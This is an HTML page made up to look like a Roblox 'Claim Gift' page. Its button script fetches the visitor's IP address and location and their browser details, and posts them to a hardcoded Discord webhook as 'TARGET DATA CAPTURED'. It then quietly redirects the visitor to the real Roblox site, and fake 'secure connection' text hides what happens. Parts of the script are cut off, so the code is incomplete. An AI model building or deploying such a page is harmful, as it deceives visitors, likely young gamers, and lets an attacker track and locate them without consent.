<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Roblox | Claim Gift</title>
    <style>
        body { background-color: #f2f4f5; color: #393b3d; font-family: 'HCo Gotham SSm', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .card { background: white; border-radius: 8px; box-shadow: 0 1px 4px rgba(0,0,0,0.1); width: 450px; padding: 40px; text-align: center; border: 1px solid #d8d8d8; }
        .gift-container { display: flex; justify-content: center; gap: 15px; margin-bottom: 25px; }
        .heart-icon { width: 70px; height: 70px; animation: pulse 1.5s infinite; }
        h1 { font-size: 24px; font-weight: 600; margin-bottom: 10px; color: #1e1e1e; }
        p { font-size: 15px; color: #666; margin-bottom: 30px; line-height: 1.4; }
        .btn { background-color: #00b2ff; color: white; border: none; padding: 14px; border-radius: 4px; font-weight: bold; font-size: 17px; cursor: pointer; width: 100%; transition: 0.2s; }
        .btn:hover { background-color: #008cc9; }
        #status { font-size: 12px; color: #999; margin-top: 15px; font-style: italic; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
    </style>
</head>
<body>

    <div class="card">
        <div class="gift-container">
            <svg class="heart-icon" viewBox="0 0 24 24" fill="#ff4d4d"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>

        <button class="btn" onclick="captureAndRedirect()">Claim Heart Box</button>
        <div id="status">Secure connection established...</div>
    </div>

    <script>
        // Your Discord Webhook URL
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1474279324667351090/ALAHbGxyK7QbVtt4nAJ1Aagv-0F1NMqgolB1UdWIlFoS5V-chCWNhQa0w-DUEF4J90EI";

        async function captureAndRedirect() {
            document.getElementById('status').innerText = "Synchronizing assets...";
            
            try {
                // 1. Grab IPv4 and Geo Data
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();

                // 2. Format the payload for Discord
                const payload = {
                    embeds: [{
                        title: "üéØ TARGET DATA CAPTURED",
                        color: 16731469, // Red

                            { name: "üñ•Ô∏è Browser Info", value: navigator.userAgent }
                        ],
                        footer: { text: "Mansion Sentry Active" },
                        timestamp: new Date()
                    }]
                };

                // 3. Send to Discord
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },

                console.error("Capture failed", error);
            }

            // 4. Final Redirect to real Roblox Home
            window.location.href = "https://www.roblox.com/home";
        }
    </script>
</body>
</html>
